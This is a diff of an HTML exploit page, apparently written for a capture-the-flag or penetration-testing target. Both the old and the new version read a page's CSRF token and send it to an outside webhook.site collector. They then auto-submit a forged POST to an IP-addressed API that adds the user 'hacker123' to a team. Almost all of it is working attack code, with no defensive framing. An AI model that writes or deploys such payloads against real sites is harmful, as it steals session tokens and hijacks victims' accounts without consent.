@@ -1,12 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/hacker123" method="POST">
-    <input type="hidden" name="csrfToken" id="csrfTokenInput">
-    <input type="submit" id="installbutton" value="Install">
-  </form>
   <script>
-    // Function to send webhook notification
+    // Send CSRF token to webhook
     function sendWebhook(status, details) {
       fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
         method: 'POST',
@@ -14,35 +10,29 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ status, details, timestamp: new Date().toISOString() })
       })
-      .then(response => {
-        if (!response.ok) {
-          console.error('Webhook POST failed:', response.status);
-        }
-      })
       .catch(err => console.error('Webhook Error:', err.message));
     }
 
-    // Log script start
-    sendWebhook('info', 'Script started');
-
-    // Try to get CSRF token by redirecting to dashboard and back
     try {
-      // Store the current URL to return after redirect
-      const returnUrl = window.location.href;
-      // Redirect to dashboard with a return URL parameter
-      window.location.href = 'http://52.47.161.102:3000/?return=' + encodeURIComponent(returnUrl);
+      // Try to access the dashboard's CSRF token
+      const csrfToken = document.querySelector('input[name="csrfToken"]')?.value || 'not found';
+      sendWebhook('xss', `CSRF token: ${csrfToken}`);
+      // Optionally, submit form if token is found
+      if (csrfToken !== 'not found') {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'http://52.47.161.102:3000/api/teams/1/addUser/hacker123';
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'csrfToken';
+        input.value = csrfToken;
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+        sendWebhook('success', 'Form submitted with CSRF token');
+      }
     } catch (err) {
-      sendWebhook('failed', 'Redirect error: ' + err.message);
-    }
-
-    // Check if returning from dashboard
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.has('csrf')) {
-      const csrfToken = urlParams.get('csrf');
-      document.getElementById('csrfTokenInput').value = csrfToken;
-      sendWebhook('info', 'CSRF token retrieved: ' + csrfToken);
-      document.getElementById('exploitForm').submit();
-      sendWebhook('success', 'Form submitted with CSRF token');
+      sendWebhook('failed', 'XSS error: ' + err.message);
     }
   </script>
 </body>
